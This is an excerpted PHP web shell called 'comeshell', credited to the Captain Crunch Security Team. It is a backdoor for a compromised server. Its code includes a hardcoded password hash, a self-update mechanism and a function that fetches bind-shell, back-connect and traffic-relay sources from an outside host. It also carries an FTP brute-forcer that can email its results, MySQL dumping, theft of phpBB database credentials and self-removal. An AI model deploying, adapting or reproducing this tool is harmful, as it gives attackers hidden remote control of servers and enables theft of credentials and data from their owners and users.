...
if (!empty($unset_surl)) {setcookie("comesh_surl"); $surl = "";}
elseif (!empty($set_surl)) {$surl = $set_surl; setcookie("comesh_surl",$surl);}
else {$surl = $_REQUEST["comesh_surl"]; //Set this cookie for manual SURL
}
$surl_autofill_include = true; //If true then search variables with descriptors (URLs) and save it in SURL.
if ($surl_autofill_include and !$_REQUEST["comesh_surl"]) {$include = "&"; foreach (explode("&",getenv("QUERY_STRING")) as $v) {$v = explode("=",$v); $name = urldecode($v[0]); $value = urldecode($v[1]); foreach (array("http://","https://","ssl://","ftp://","\\\\") as $needle) {if (strpos($value,$needle) === 0) {$includestr .= urlencode($name)."=".urlencode($value)."&";}}} if ($_REQUEST["surl_autofill_include"]) {$includestr .= "surl_autofill_include=1&";}}
if (empty($surl))
{
...
$pass = ""; //password
$md5_pass = "5b1127bd84c340ea7a73ff9bb1840ac2"; //md5-cryped pass. if null, md5($pass)
$host_allow = array("*"); //array ("{mask}1","{mask}2",...), {mask} = IP or HOST e.g. array("192.168.0.*","127.0.0.1")
$login_txt = "Restricted area"; //http-auth message.
$accessdeniedmess = "<a href=\"http://ccteam.ru/releases/comeshell\">comeshell v.".$shver."</a>: access denied";
$gzipencode = true; //Encode with gzip?
$updatenow = false; //If true, update now (this variable will be false)
$comesh_updateurl = "http://ccteam.ru/update/comeshell/"; //Update server
$comesh_sourcesurl = "http://ccteam.ru/files/comesh_sources/"; //Sources-server
...
$bindport_pass = "come";	  // default password for binding
...
$sess_cookie = "comeshvars"; // Cookie-variable name
...
$s = "!^(".implode("|",$tmp).")$!i";
if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {exit("<a href=\"http://ccteam.ru/releases/ccomeshell\">comeshell</a>: Access Denied - your host (".getenv("REMOTE_ADDR").") not allow");}
if (!empty($login))
{
    ...
    if (($_SERVER["PHP_AUTH_USER"] != $login) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass))
    {
        ...
        header("WWW-Authenticate: Basic realm=\"comeshell ".$shver.": ".$login_txt."\"");
...
if ($act != "img")
{
    $lastdir = realpath(".");
    chdir($curdir);
    if ($selfwrite or $updatenow) {@ob_clean(); comesh_getupdate($selfwrite,1); exit;}
    ...
    if (!function_exists("come_buff_prepare"))
    {
        function come_buff_prepare()
        {
            global $sess_data;
            global $act;
    ...
    come_buff_prepare();
    if (!function_exists("come_sess_put"))
    {
        function come_sess_put($data)
        {
            global $sess_cookie;
            global $sess_data;
            come_buff_prepare();
    ...
    if (!function_exists("comegetsource"))
    {
        function comegetsource($fn)
        {
            global $comesh_sourcesurl;
            $array = array(
                "comesh_bindport.pl" => "comesh_bindport_pl.txt",
                "comesh_bindport.c" => "comesh_bindport_c.txt",
                "comesh_backconn.pl" => "comesh_backconn_pl.txt",
                "comesh_backconn.c" => "comesh_backconn_c.txt",
                "comesh_datapipe.pl" => "comesh_datapipe_pl.txt",
                "comesh_datapipe.c" => "comesh_datapipe_c.txt",
            );
            $name = $array[$fn];
            if ($name) {return file_get_contents($comesh_sourcesurl.$name);}
            else {return false;}
        }
    }
    if (!function_exists("comesh_getupdate"))
    {
        function comesh_getupdate($update = true)
        {
            $url = $GLOBALS["comesh_updateurl"]."?version=".urlencode(base64_encode($GLOBALS["shver"]))."&updatenow=".($updatenow?"1":"0")."&";
            ...
            else
            {
                ...
                if ($data{0} == "\x99" and $data{1} == "\x03")
                {
                    ...
                    if ($update)
                    {
                        ...
                        {
                            $fp = fopen(__FILE__,"w");
                            if (!$fp) {return "Local error: can't write update to ".__FILE__."! You may download comeshell.php manually <a href=\"".$sourceurl."\"><u>here</u></a>.";}
    ...
    if (!function_exists("mysql_dump"))
    {
        function mysql_dump($set)
        {
            ...
            $out = "# Dumped by comeShell.SQL v. ".$shver."
...
";
    ...
    if (!function_exists("mysql_query_form"))
    {
        function mysql_query_form()
        {
            ...
            {
                echo "<table border=0><tr><td><form name=\"comesh_sqlquery\" method=POST><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":</b><br><br><textarea name=sql_query cols=100 rows=10>".htmlspecialchars($sql_query)."</textarea><br><br><input type=hidden name=act value=sql><input type=hidden name=sql_act value=query><input type=hidden name=sql_tbl value=\"".htmlspecialchars($sql_tbl)."\"><input type=hidden name=submit value=\"1\"><input type=hidden name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=submit name=sql_confirm value=\"Yes\">&nbsp;<input type=submit value=\"No\"></form></td>";
                if ($tbl_struct)
                {
                    echo "<td valign=\"top\"><b>Fields:</b><br>";
                    foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "» <a href=\"#\" onclick=\"document.comesh_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br>";}
                    echo "</td></tr></table>";
                }
            }
    ...
    if (!function_exists("comefsearch"))
    {
        function comefsearch($d)
        {
            global $found;
            global $found_d;
            global $found_f;
            ...
            while (($f = readdir($h)) !== false)
            {
                if($f != "." && $f != "..")
                {
                    ...
                    if (is_dir($d.$f))
                    {
                        ...
                        if (!is_link($d.$f)) {comefsearch($d.$f);}
                    }
                    else
                    {
                        $search_i_f++;
...
//Sending headers
    ...
    if ($act == "ftpquickbrute")
    {
        ...
        {
            function comeftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)
            {
            ...
            if (!empty($submit))
            {
                ...
                else
                {
                    if ($fqb_logging)
                    {
                        ...
                        $fqb_log = "FTP Quick Brute (called comeshell v. ".$shver.") started at ".date("d.m.Y H:i:s")."\r\n\r\n";
                    ...
                    while(!feof($fp))
                    {
                        ...
                        if (comeftpbrutecheck("localhost",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh))
                        {
                    ...
                    if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
                    if ($fqb_logemail) {@mail($fqb_logemail,"comeshell v. ".$shver." report",$fqb_log);}
                    fclose($fqb_logfp);
                }
            }
            else
            {
                $logfile = $tmpdir_logs."comesh_ftpquickbrute_".date("d.m.Y_H_i_s").".log";
    ...
    if ($act == "phpinfo") {@ob_clean(); phpinfo(); comeshexit();}
    if ($act == "security")
    {
 ...
 <br></center><b>Base64:</b><center>base64_encode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".base64_encode($encoder_input)."\" readonly></center>";
    ...
    if ($act == "selfremove")
    {
        ...
        {
            if (unlink(__FILE__)) {@ob_clean(); echo "Thanks for using comeshell v.".$shver."!"; comeshexit(); }
    ...
    if ($act == "update") {$ret = comesh_getupdate(!!$confirmupdate); echo "<b>".$ret."</b>"; if (stristr($ret,"new version")) {echo "<br><br><input type=button onclick=\"location.href='".$surl."act=update&confirmupdate=1';\" value=\"Update now\">";}}
    if ($act == "feedback")
    {
        ...
        if (!empty($submit))
        {
            ...
            $body = "comeshell v.".$shver." feedback #".$ticket."\nName: ".htmlspecialchars($fdbk_name)."\nE-mail: ".htmlspecialchars($fdbk_email)."\nMessage:\n".htmlspecialchars($fdbk_body)."\n\nIP: ".$REMOTE_ADDR;
            if (!empty($fdbk_ref))
            {
                $tmp = @ob_get_contents();
                ob_clean();
            ...
            mail($suppmail,"comeshell v.".$shver." feedback #".$ticket,$body,"FROM: ".$suppmail);
...
<input type=submit name=submit value=\"Upload\">
    ...
    {
        if ($act == "copy") {$err = ""; $sess_data["copy"] = array_merge($sess_data["copy"],$actbox); come_sess_put($sess_data); $act = "ls"; }
        elseif ($act == "cut") {$sess_data["cut"] = array_merge($sess_data["cut"],$actbox); come_sess_put($sess_data); $act = "ls";}
        elseif ($act == "unselect") {foreach ($sess_data["copy"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["cut"][$k]);}} come_sess_put($sess_data); $act = "ls";}
        if ($actemptybuff) {$sess_data["copy"] = $sess_data["cut"] = array(); come_sess_put($sess_data);}
        elseif ($actpastebuff)
        {
            $psterr = "";
            ...
            if ($vd == "f")
            {
                ...
                foreach ($objects as $a)
                {
                    ...
                    foreach ($regxp_highlight as $r)
                    {
                        if (ereg($r[0],$o))
                        {
                            if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo "Warning! Configuration error in \$regxp_highlight[".$k."][0] - unknown command."; comeshexit();}
                            else
                            {
                                $r[1] = round($r[1]);
                                $isdir = is_dir($v);
  ...
  <b><img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\">";
    ...
    {
        $bndportsrcs = array(
            "comesh_bindport.pl"=>array("Using PERL","perl %path %port"),
            "comesh_bindport.c"=>array("Using C","%path %port %pass")
        );
        $bcsrcs = array(
            "comesh_backconn.pl"=>array("Using PERL","perl %path %host %port"),
            "comesh_backconn.c"=>array("Using C","%path %host %port")
        );
        $dpsrcs = array(
            "comesh_datapipe.pl"=>array("Using PERL","perl %path %localport %remotehost %remoteport"),
            "comesh_datapipe.c"=>array("Using C","%path %localport %remoteport %remotehost")
        );
        ...
        if (!empty($bindsubmit))
        {
            ...
            else
            {
                ...
                elseif (!$data = comegetsource($bind["src"])) {echo "Can't download sources!";}
                else
                {
        ...
        if (!empty($bcsubmit))
        {
            ...
            else
            {
                ...
                $fp = fopen($srcpath,"ab+");
                if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!<br>";}
                elseif (!$data = comegetsource($bc["src"])) {echo "Can't download sources!";}
                else
                {
                    fwrite($fp,$data,strlen($data));
                    fclose($fp);
        ...
        if (!empty($dpsubmit))
        {
            ...
            else
            {
                ...
                $fp = fopen($srcpath,"ab+");
                if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!<br>";}
                elseif (!$data = comegetsource($datapipe["src"])) {echo "Can't download sources!";}
                else
                {
                    fwrite($fp,$data,strlen($data));
                    fclose($fp);
            ...
            elseif ($ft == "code")
            {
                if (ereg("php"."BB 2.(.*) auto-generated config file",$r))
                {
                    ...
                    if (count($arr == 18))
                    {
                        ...
                        else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported by comeshell. Please, report us for fix.";}
...
?>
    ...
    <br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ comeshell v. <?php echo $shver; ?> <a href="<?php echo $surl; ?>act=about"><u><b>powered by</b></u></a> Captain Crunch Security Team | <a href="http://ccteam.ru"><font color="#FF0000">http://ccteam.ru</font></a><font color="#FF0000"></font> | Generation time: <?php echo round(getmicrotime()-starttime,4); ?> ]--</b></p></td></tr></table>
</body></html><?php chdir($lastdir); comeshexit(); ?>